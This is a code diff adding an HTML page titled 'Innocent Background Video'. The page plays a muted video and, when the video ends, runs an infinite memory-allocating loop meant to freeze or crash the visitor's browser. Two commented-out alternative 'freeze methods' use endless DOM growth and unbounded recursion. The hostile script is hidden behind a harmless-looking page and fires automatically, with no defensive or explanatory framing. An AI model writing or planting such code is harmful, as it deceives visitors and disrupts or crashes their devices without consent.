@@ -1,0 +1,38 @@
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <title>Innocent Background Video</title>  
+  <style>  
+    #bgVideo {  
+      position: fixed;  
+      right: 0;  
+      bottom: 0;  
+      min-width: 100%;  
+      min-height: 100%;  
+      z-index: -1;  
+    }  
+  </style>  
+</head>  
+<body>  
+  <video id="bgVideo" autoplay muted>  
+    <source src="video.mp4" type="video/mp4">  
+  </video>  
+
+  <script>  
+    const video = document.getElementById('bgVideo');  
+    video.addEventListener('ended', () => {  
+      // Choose one freeze method:  
+      // Memory Bomb  
+      const arr = [];  
+      while (true) arr.push(new Array(1000000).fill(0));  
+
+      // OR Infinite DOM  
+      // while (true) document.body.innerHTML += "<div></div>";  
+
+      // OR Recursion  
+      // function crash() { crash(); } crash();  
+    });  
+  </script>  
+</body>  
+</html>  
